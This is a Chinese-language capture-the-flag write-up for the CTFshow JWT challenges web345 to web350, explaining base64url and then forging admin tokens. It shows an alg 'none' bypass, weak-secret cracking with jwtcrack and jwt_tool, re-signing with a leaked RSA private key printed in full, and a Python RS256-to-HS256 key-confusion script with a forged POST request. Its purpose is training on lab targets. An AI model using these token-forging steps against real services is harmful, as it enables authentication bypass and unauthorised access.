# CTFSHOW  - JWT

[TOC]

---

首先一个细节，我以前一直以为是jwt进行base64编码，但是其实不然

采用的是base64url编码

1. 字符集替换

- **Base64**
  - 使用字符集：`A-Z`, `a-z`, `0-9`, `+`, `/`（共64个字符）
  - 示例：`aGVsbG8=`
  - **问题**：`+`和`/`在URL、文件名中可能引发冲突（如URL参数会被转义）。
- **Base64URL**
  - 替换字符：
    - `+` → `-`
    - `/` → `_`
  - 示例：`aGVsbG8`
  - **作用**：避免URL编码冲突，直接嵌入URL参数无需额外转义。

2. 填充处理

- Base64
  - 必须使用`=`填充至4字节对齐（例如`aGVsbG8=`）。
- Base64URL
  - 通常省略填充符`=`（如`aGVsbG8`）。
  - 部分实现可能保留填充，需根据具体协议处理。

| 原始数据 | Base64     | Base64URL |
| -------- | ---------- | --------- |
| `hello`  | `aGVsbG8=` | `aGVsbG8` |

## web345

进入题目可以在cookie中得到这个

```
eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3MjU5NDk2ODQsImV4cCI6MTcyNTk1Njg4NCwibmJmIjoxNzI1OTQ5Njg0LCJzdWIiOiJ1c2VyIiwianRpIjoiMDk0NmQ3MDU4OGJmOGY5MTQ3MjYzYWMzODQzZTMzYjcifV0
```

![image-20240910233241981](https://gitee.com/bx33661/image/raw/master/path/image-20240910233241981.png)

我们需要的是修改"sub"值为admin，同时访问/admin/

```
eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3MjU5NDk2ODQsImV4cCI6MTcyNTk1Njg4NCwibmJmIjoxNzI1OTQ5Njg0LCJzdWIiOiJhZG1pbiIsImp0aSI6IjA5NDZkNzA1ODhiZjhmOTE0NzI2M2FjMzg0M2UzM2I3In1d
```

但是这里只做这个修改不行，同时改算法为HS256才行

```
eyJhbGciOiJoczI1NiIsInR5cCI6Imp3dCJ9.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3MjU5NDk2ODQsImV4cCI6MTcyNTk1Njg4NCwibmJmIjoxNzI1OTQ5Njg0LCJzdWIiOiJhZG1pbiIsImp0aSI6IjA5NDZkNzA1ODhiZjhmOTE0NzI2M2FjMzg0M2UzM2I3In1d
```

```
eyJhbGciOiJIUzI1NiIsInR5cCI6Imp3dCJ9.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3MjU5NDk2ODQsImV4cCI6MTcyNTk1Njg4NCwibmJmIjoxNzI1OTQ5Njg0LCJzdWIiOiJhZG1pbiIsImp0aSI6IjA5NDZkNzA1ODhiZjhmOTE0NzI2M2FjMzg0M2UzM2I3In1d.1H0lYhYYy_qVcebYwcGFA0AxwXU_ySAW7bvHZXONCZI
```

![image-20240910145556223](https://gitee.com/bx33661/image/raw/master/path/image-20240910145556223.png)

得到flag



## web346

可以使用`jwt.io`或者jwt_tool工具

```bash
PS E:\Tools\CTF\WEB\jwt_tool> python ./jwt_tool.py 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTczODM4NTg2NiwiZXhwIjoxNzM4MzkzMDY2LCJuYmYiOjE3MzgzODU4NjYsInN1YiI6InVzZXIiLCJqdGkiOiJjY2Y0MjcyMDEzYjJlYjhhY2JhYWQ0MDRiNzVhZTBmMiJ9.LHlUX_XsF7FMhDCal2D1G2axnprfxx7tRCe80VY1CTY'

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi

Original JWT:

=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = "HS256"
[+] typ = "JWT"

Token payload values:
[+] iss = "admin"
[+] iat = 1738385866    ==> TIMESTAMP = 2025-02-01 12:57:46 (UTC)
[+] exp = 1738393066    ==> TIMESTAMP = 2025-02-01 14:57:46 (UTC)
[+] nbf = 1738385866    ==> TIMESTAMP = 2025-02-01 12:57:46 (UTC)
[+] sub = "user"
[+] jti = "ccf4272013b2eb8acbaad404b75ae0f2"

Seen timestamps:
[*] iat was seen
[*] exp is later than iat by: 0 days, 2 hours, 0 mins

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------
```

这个题使用的事空密钥绕过，常规修改不行

```bash
{"alg":"none","typ":"JWT"}
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTczODM4NTg2NiwiZXhwIjoxNzM4MzkzMDY2LCJuYmYiOjE3MzgzODU4NjYsInN1YiI6ImFkbWluIiwianRpIjoiY2NmNDI3MjAxM2IyZWI4YWNiYWFkNDA0Yjc1YWUwZjIifQ==
```



```bash
{"iss":"admin","iat":1738385866,"exp":1738393066,"nbf":1738385866,"sub":"admin","jti":"ccf4272013b2eb8acbaad404b75ae0f2"}
eyJpc3MiOiJhZG1pbiIsImlhdCI6MTczODM4NTg2NiwiZXhwIjoxNzM4MzkzMDY2LCJuYmYiOjE3MzgzODU4NjYsInN1YiI6ImFkbWluIiwianRpIjoiY2NmNDI3MjAxM2IyZWI4YWNiYWFkNDA0Yjc1YWUwZjIifQ==
```

得到flag

```(空)
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTczODM4NTg2NiwiZXhwIjoxNzM4MzkzMDY2LCJuYmYiOjE3MzgzODU4NjYsInN1YiI6ImFkbWluIiwianRpIjoiY2NmNDI3MjAxM2IyZWI4YWNiYWFkNDA0Yjc1YWUwZjIifQ.
```



## web347 

进入页面

```bash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTczODQ3MDEzOSwiZXhwIjoxNzM4NDc3MzM5LCJuYmYiOjE3Mzg0NzAxMzksInN1YiI6InVzZXIiLCJqdGkiOiJlODk3ZjFjZjA5NTViYzE0ZTI2MDljMmFkZjExZTA1MSJ9._op6HxDxwvBlnDwpTiFJK3r5AgsAbPWM87793H6p4_I
```

这一题是弱密钥，爆破可以爆出来

1. 使用jwtcrack

```bash
bx@bx-VMware-Virtual-Platform:~/桌面/ctf/WEB/c-jwt-cracker$ ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTczODQ3MDEzOSwiZXhwIjoxNzM4NDc3MzM5LCJuYmYiOjE3Mzg0NzAxMzksInN1YiI6InVzZXIiLCJqdGkiOiJlODk3ZjFjZjA5NTViYzE0ZTI2MDljMmFkZjExZTA1MSJ9._op6HxDxwvBlnDwpTiFJK3r5AgsAbPWM87793H6p4_I 0123456abc 6 sha256
Secret is "123456"
```

2. 利用我们之前那个jwt_tool爆破

```bash
PS E:\Tools\CTF\WEB\jwt_tool> python ./jwt_tool.py "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTczODQ3MDEzOSwiZXhwIjoxNzM4NDc3MzM5LCJuYmYiOjE3Mzg0NzAxMzksInN1YiI6InVzZXIiLCJqdGkiOiJlODk3ZjFjZjA5NTViYzE0ZTI2MDljMmFkZjExZTA1MSJ9._op6HxDxwvBlnDwpTiFJK3r5AgsAbPWM87793H6p4_I" -C -d jwt-common.txt

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi

Original JWT:

[+] 123456 is the CORRECT key!
You can tamper/fuzz the token contents (-T/-I) and sign it using:
python3 jwt_tool.py [options here] -S hs256 -p "123456"
```



![image-20250202123120127](https://gitee.com/bx33661/image/raw/master/path/image-20250202123120127.png)

```bash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTczODQ3MDEzOSwiZXhwIjoxNzM4NDc3MzM5LCJuYmYiOjE3Mzg0NzAxMzksInN1YiI6ImFkbWluIiwianRpIjoiZTg5N2YxY2YwOTU1YmMxNGUyNjA5YzJhZGYxMWUwNTEifQ.JEWnv62qMtjK83KekKLEakL5C6obz3XF1fQxAPs9Ezs
```

得到flag



## web348

> 题目提示：jwt开始啦,爆破

```bash
bx@bx-VMware-Virtual-Platform:~/桌面/ctf/WEB/c-jwt-cracker$ ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTczODQ3NDQxMywiZXhwIjoxNzM4NDgxNjEzLCJuYmYiOjE3Mzg0NzQ0MTMsInN1YiI6InVzZXIiLCJqdGkiOiJjMTg2YWNjOTY4MWRjZGMwMzViMDMxMmQ1Zjg1ODU5NyJ9.lCzDEfATJu-nxw31o29PIEtGLnJYKCWNB-qEFDpYlgk 0123456abc 6 sha256
Secret is "aaab"
```

得到密钥

进行修改编码

```bash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTczODQ3NDQxMywiZXhwIjoxNzM4NDgxNjEzLCJuYmYiOjE3Mzg0NzQ0MTMsInN1YiI6ImFkbWluIiwianRpIjoiYzE4NmFjYzk2ODFkY2RjMDM1YjAzMTJkNWY4NTg1OTcifQ._X5u00QnT06aZzuYa4ZNfFU4DSUlnLy4_KCaF8Lj54E
```



## web349

给了源码

```javascript
/* GET home page. */
router.get('/', function(req, res, next) {
    res.type('html');
    var privateKey = fs.readFileSync(process.cwd()+'//public//private.key');
    var token = jwt.sign({ user: 'user' }, privateKey, { algorithm: 'RS256' });
    res.cookie('auth',token);
    res.end('where is flag?');
    
  });
  
  router.post('/',function(req,res,next){
      var flag="flag_here";
      res.type('html');
      var auth = req.cookies.auth;
      var cert = fs.readFileSync(process.cwd()+'//public/public.key');  // get public key
      jwt.verify(auth, cert, function(err, decoded) {
        if(decoded.user==='admin'){
            res.end(flag);
        }else{
            res.end('you are not admin');
        }
      });
  });
```

我们可以访问`public.key`和`private.key`把公钥和私钥下载下来

- public

```(空)
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDNioS2aSHtu6WIU88oWzpShhkb
+r6QPBryJmdaR1a3ToD9sXDbeni5WTsWVKrmzmCk7tu4iNtkmn/r9D/bFcadHGnX
YqlTJItOdHZio3Bi1J2Elxg8IEBKx9g6RggTOGXQFxSxlzLNMRzRC4d2PcA9mxjA
bG1Naz58ibbtogeglQIDAQAB
-----END PUBLIC KEY-----
```

- private

```(空)
-----BEGIN RSA PRIVATE KEY-----
MIICWwIBAAKBgQDNioS2aSHtu6WIU88oWzpShhkb+r6QPBryJmdaR1a3ToD9sXDb
eni5WTsWVKrmzmCk7tu4iNtkmn/r9D/bFcadHGnXYqlTJItOdHZio3Bi1J2Elxg8
IEBKx9g6RggTOGXQFxSxlzLNMRzRC4d2PcA9mxjAbG1Naz58ibbtogeglQIDAQAB
AoGAE+mAc995fvt3zN45qnI0EzyUgCZpgbWg8qaPyqowl2+OhYVEJq8VtPcVB1PK
frOtnyzYsmbnwjZJgEVYTlQsum0zJBuTKoN4iDoV0Oq1Auwlcr6O0T35RGiijqAX
h7iFjNscfs/Dp/BnyKZuu60boXrcuyuZ8qXHz0exGkegjMECQQD1eP39cPhcwydM
cdEBOgkI/E/EDWmdjcwIoauczwiQEx56EjAwM88rgxUGCUF4R/hIW9JD1vlp62Qi
ST9LU4lxAkEA1lsfr9gF/9OdzAsPfuTLsl+l9zpo1jjzhXlwmHFgyCAn7gBKeWdv
ubocOClTTQ7Y4RqivomTmlNVtmcHda1XZQJAR0v0IZedW3wHPwnT1dJga261UFFA
+tUDjQJAERSE/SvAb143BtkVdCLniVBI5sGomIOq569Z0+zdsaOqsZs60QJAYqtJ
V7EReeQX8693r4pztSTQCZBKZ6mJdvwidxlhWl1q4+QgY+fYBt8DVFq5bHQUIvIW
zawYVGZdwvuD9IgY/QJAGCJbXA+Knw10B+g5tDZfVHsr6YYMY3Q24zVu4JXozWDV
x+G39IajrVKwuCPG2VezWfwfWpTeo2bDmQS0CWOPjA==
-----END RSA PRIVATE KEY-----
```

我们获取的原始jwt如下

```bash
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImlhdCI6MTczODQ3NTY0Nn0.Z13PT4Tv5LYAM7YwNbMnkdCsICN3-pKtZv_-qgvCfuVe9ZE4FbF2BDgaoXQ6ErfQQxKujeYRdQUt5KiUgOUn7DEPHO7CyAJBhuL5YWPWdcNEGrvAgeNmddFgImE5V2BtK-hdh3UDhgUsnaeZjBhMTLI7pFBwuof8OCciqKb1ltQ
```

注意一个细节：
**必须是POST发包才能得到flag，观察源码可以发现**

利用py写一个编解码脚本,非对称加密

```python
import jwt
from jwt.exceptions import InvalidTokenError

# 原始JWT,这里填写你的jwt
original_jwt = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImlhdCI6MTczODQ3NjMwNX0.j30UimIQuskPL-e2kCy0DZLSdI3f-MPITzP0UTpxhRStDa1-sINp-flfFkaoflKp28tnA0RulclINWsKwRMi1fO0M4CVyRqXK143TbsffxbLoILtEI2k5nu-Co56Vo66Bx6dap1v852-FPBh7xuCvYge-Lv_WPQpLFaifokSveo"

# 加载密钥
with open("private.key", "rb") as f:
    private_key = f.read()

with open("public.key", "rb") as f:
    public_key = f.read()

try:
    # 解码原始JWT
    decoded = jwt.decode(original_jwt, public_key, algorithms=["RS256"], options={"verify_signature": True})
    
    # 修改claims（根据需要调整）
    decoded["user"] = "admin"
    
    # 生成新JWT
    new_jwt = jwt.encode(
        payload=decoded,
        key=private_key,
        algorithm="RS256",
        headers={"alg": "RS256", "typ": "JWT"}
    )
    
    print(f"New JWT: {new_jwt}")

except InvalidTokenError as e:
    print(f"Invalid token: {str(e)}")
except Exception as e:
    print(f"Error: {str(e)}")

```

Payload

```http
POST / HTTP/1.1
Host: 344eb386-48b4-4414-b697-07e353baf764.challenge.ctf.show
Cookie: auth=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE3Mzg0NzYzMDV9.mTZBKRBzymkGVpPuE0w8wLgv3270LT1iyCpbt4q9WxbTMJJ1dvch4bj1chUApdnsj2WILEcjQ9YDa93YCSKC_YfHEXOkq-sULpqElQpnuWE2WyY7bMW80kKOp8iS3MKeLXZmQxa4yqTZdN_ZaC3TqccrXBgbaS_OqnoOULXMSrU
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"
Referer: https://ctf.show/
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-site
Accept-Encoding: gzip, deflate, br, zstd
sec-ch-ua-mobile: ?0
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
sec-ch-ua-platform: "Windows"
Content-Type: application/x-www-form-urlencoded


```

在相应之中拿到flag



## web350

给了源码

```javascript
var express = require('express');
var router = express.Router();
var jwt = require('jsonwebtoken');
var fs = require('fs');

/* GET home page. */
router.get('/', function(req, res, next) {
  res.type('html');
  var privateKey = fs.readFileSync(process.cwd()+'//routes/private.key');
  var token = jwt.sign({ user: 'user' }, privateKey, { algorithm: 'RS256' });

  res.cookie('auth',token);
  res.end('where is flag?');
  
});

router.post('/',function(req,res,next){
	var flag="flag_here";
	res.type('html');
	var auth = req.cookies.auth;
	var cert = fs.readFileSync(process.cwd()+'//routes/public.key');  // get public key
	jwt.verify(auth, cert,function(err, decoded) {
	  if(decoded.user==='admin'){
	  	res.end(flag);
	  }else{
	  	res.end('you are not admin'+err);
	  }
	});
});

module.exports = router;

```

找了私钥没找到，学习之后发现，私钥无法获得，因此要把非对称加密变成对称加密

公钥如下

```(空)
-----CTFSHOW 36D BOY -----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDfdIGdsPuxSGPuosgarjZ7zO4t
HHmQ7+6WUiKBA0ykcXe6aK9zcVVKCcEwyMbENgTF4Et8RjZ3NKs1Co74Q+4gII5G
IgQFSS0PzTOKmoTY1fnA6+jqBquV4RnU283kgdaKmkaSRdiwsW2EaagMgZdG6WJk
65RmH98bgnIAGW5nawIDAQAB
-----END PUBLIC KEY-----
```

修改脚本：
```python
import jwt

payload={
  "user": "admin",
  "iat": 1732026256
}

pub=open("public.key","rb").read()
jwt_headers={
  "alg": "HS256",
  "typ": "JWT"
}

jwt_token=jwt.encode(payload,key=pub,algorithm='HS256',headers=jwt_headers,)

print(jwt_token)
```

Post发包得到flag

